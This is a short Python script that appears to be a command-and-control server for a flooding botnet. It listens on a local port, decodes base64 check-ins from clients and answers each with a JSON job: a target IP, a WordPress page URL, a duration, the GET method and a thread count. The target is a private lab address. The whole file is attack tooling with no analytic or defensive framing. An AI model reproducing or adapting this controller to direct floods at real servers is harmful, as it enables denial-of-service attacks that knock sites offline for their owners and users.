import socket
import base64
import json

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

parameters = {
    "destinationIp": "192.168.150.132",
    "url": "/wordpress/2019/04/22/witaj-swiecie/",
    "duration": 120,
    "method": "GET",
    "protocol": "http",
    "port": "",
    "threads": 50

}

serialized = json.dumps(parameters).encode('utf-8')

# Bind the socket to the port
server_address = ('localhost', 8888)
print('starting up on {} port {}'.format(*server_address))
sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)

while True:
    # Wait for a connection
    print('waiting for a connection')
    connection, client_address = sock.accept()
    try:
        print('connection from', client_address)
        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(64)
            print('received {!r}'.format(base64.b64decode(data)))
            if data:
                print('sending data back to the client')
                connection.sendall(serialized)
                connection.sendall(b"\n")
                print('sent')
            else:
                print('no data from', client_address)
                break
    finally:
        # Clean up the connection
        connection.close()
